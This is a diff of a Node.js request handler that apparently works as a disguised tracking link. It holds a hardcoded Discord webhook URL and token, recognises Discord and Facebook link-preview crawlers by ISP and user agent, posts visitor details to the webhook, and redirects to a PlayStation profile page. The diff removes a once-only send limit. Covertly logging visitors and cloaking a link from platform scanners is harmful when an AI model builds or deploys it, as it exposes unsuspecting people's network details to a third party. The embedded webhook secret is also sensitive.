@@ -1,7 +1,7 @@
 import fetch from 'node-fetch';
 
 const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";
-let messageSent = false; // Control variable to prevent multiple sends
+
 
 async function sendToWebhook(message) {
     try {
@@ -80,7 +80,7 @@ export default async function handler(req, res) {
             : "Not available";
 
         // Check 1: Google LLC and Discordbot
-        if (!messageSent && ipDetails.isp === "Google LLC" && userAgent === "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)") {
+        if (ipDetails.isp === "Google LLC" && userAgent === "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)") {
             const message = {
                 embeds: [
                     {
@@ -96,13 +96,12 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            messageSent = true;
             res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
             return res.end();
         }
 
         // Check 2: Facebook External Hit
-        if (!messageSent && ipDetails.isp === "Facebook, Inc." && userAgent === "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)") {
+        if (ipDetails.isp === "Facebook, Inc." && userAgent === "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)") {
             const message = {
                 embeds: [
                     {
@@ -118,7 +117,6 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            messageSent = true;
             res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
             return res.end();
         }
